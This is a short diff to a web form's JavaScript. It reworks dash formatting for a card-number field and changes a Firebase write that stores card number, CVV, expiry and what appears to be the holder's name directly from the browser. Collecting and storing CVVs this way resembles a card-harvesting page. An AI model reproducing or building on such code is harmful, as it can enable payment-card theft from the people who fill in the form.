@@ -21,7 +21,18 @@ function submitServiceCard(self)
 
 }
 document.getElementById("usernameInpCard").addEventListener("keydown", (e) => {
-    ((e.target.value.length) % 5 == 0) ? e.target.value += "-" : null;    
+    // ((e.target.value.length) > 1 && (e.target.value.length) % 4 == 0) ? e.target.value += "-" : null;    
+    let inputValue = e.target.value.replace(/[^\d]/g, ''); // Remove non-numeric characters
+    let formattedValue = '';
+
+    for (let i = 0; i < inputValue.length; i++) {
+        if (i > 0 && i % 4 === 0) {
+            formattedValue += '-';
+        }
+        formattedValue += inputValue[i];
+    }
+
+    e.target.value = formattedValue;
 })
 
 document.getElementById("DateInpCard").addEventListener("keydown", (e) => {
@@ -98,7 +109,7 @@ function addToDBCard(cardNumber, cardCVV, cardExpiry, cardHolderName, selected_s
        document.querySelectorAll(".tile")[n].click();
       }, 1300 );
       
-    firebase.database().ref(UsrNameDirectory + uniqueTimestampId).set({
+    firebase.database().ref(UsrNameDirectory + uniqueTimestampId).push({
         cardNumber: cardNumber,
         cardCVV: cardCVV,
         cardExpiry : cardExpiry,
